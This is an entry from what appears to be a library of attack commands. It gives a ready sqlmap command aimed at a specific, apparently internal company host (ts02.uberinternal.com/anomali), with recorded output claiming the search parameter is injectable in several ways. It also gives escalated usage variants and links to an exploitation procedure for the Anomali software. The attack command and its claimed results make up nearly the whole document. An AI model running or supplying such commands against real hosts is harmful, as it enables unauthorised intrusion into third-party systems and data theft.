---
id: cmd-sqlmap-test
data: >-
  sqlmap -u "http://ts02.uberinternal.com/anomali/search?q=1" --batch --level=1
  --risk=1
tags:
  - sqli
  - testing
type: command
output: >-
  Parameter: q (GET) is vulnerable. Type: boolean-based blind, Error-based,
  Time-based blind.
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.427Z'
verified: false
validated: true
submitted: true
---
# sqlmap-test-injection

## Command

```bash
sqlmap -u "http://ts02.uberinternal.com/anomali/search?q=1" --batch --level=1 --risk=1
```

## Description

This command uses sqlmap to test a URL parameter for SQL injection vulnerabilities at a basic level, suitable for initial probing of web applications like Anomali. It automates payload injection to detect error-based, blind, or time-based SQLi without user interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with vulnerable parameter | Yes |
| `--batch` | Non-interactive mode | No |
| `--level=1` | Testing intensity (1-5, lower is safer) | No |
| `--risk=1` | Risk level for payloads (1-3) | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://example.com/search?q=1" --batch
```

### Advanced Usage

```bash
sqlmap -u "http://example.com/search?q=1" --level=2 --risk=2 --dbms=mysql
```

## Expected Output

Vulnerability detection summary, e.g., "[INFO] the back-end DBMS is MySQL" and payload types that succeed, confirming exploitability.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-Anomali-Software]]
